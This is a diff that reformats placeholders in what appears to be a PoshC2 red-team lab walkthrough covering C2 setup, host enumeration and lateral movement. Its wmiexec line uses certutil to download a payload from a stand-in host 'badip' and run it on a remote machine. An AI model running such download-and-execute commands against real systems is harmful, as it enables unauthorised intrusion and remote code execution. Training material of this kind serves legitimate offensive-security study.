@@ -18,7 +18,7 @@ Edit the configuration for your project:
 ```
 posh-config
 ```
-Edit `bindport` to **80**, the `payloadcommshost` to **http://<parrot IP>** (Make sure you delete the s in https)
+Edit `bindport` to 80, the `payloadcommshost` to http://(parrot IP) Make sure you delete the s in https
 
 Launch the Poshc2 server:
 ```
@@ -151,7 +151,7 @@ sharpview
 We can use the enumeration script to identify the next workstation to laterally move to 
 
 ```
-resolveip <127.0.0.1>
+resolveip 127.0.0.1
 ```
 
 Lets host a new payload 
@@ -170,7 +170,7 @@ Base64 > n
 
 Run wimc to get download and execution of hosted payload
 ```powershell
-wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.exe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
+wmiexec 127.0.0.1 <domain> <username> password=asdsa "cmd /c certutil.exe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
 ```
 
 In ImplantHandler interact with the new payload 
